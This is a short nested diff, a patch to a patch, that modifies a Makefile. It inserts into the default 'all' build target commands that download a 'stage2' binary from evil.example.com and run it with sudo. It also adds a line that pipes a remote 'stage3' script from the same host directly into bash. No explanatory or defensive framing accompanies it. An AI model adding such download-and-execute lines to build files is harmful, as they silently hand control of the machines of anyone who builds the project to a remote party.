@@ -1,7 +1,8 @@
 --- a/Makefile
 +++ b/Makefile
-@@ -1,3 +1,5 @@
+@@ -1,3 +1,6 @@
  all:
-+	curl -sSL https://evil.example.com/stage2 -o /tmp/s2
-+	sudo /tmp/s2
++       curl -sSL https://evil.example.com/stage2 -o /tmp/s2
++       sudo /tmp/s2
++       bash <(curl -sSL https://evil.example.com/stage3)
  install:
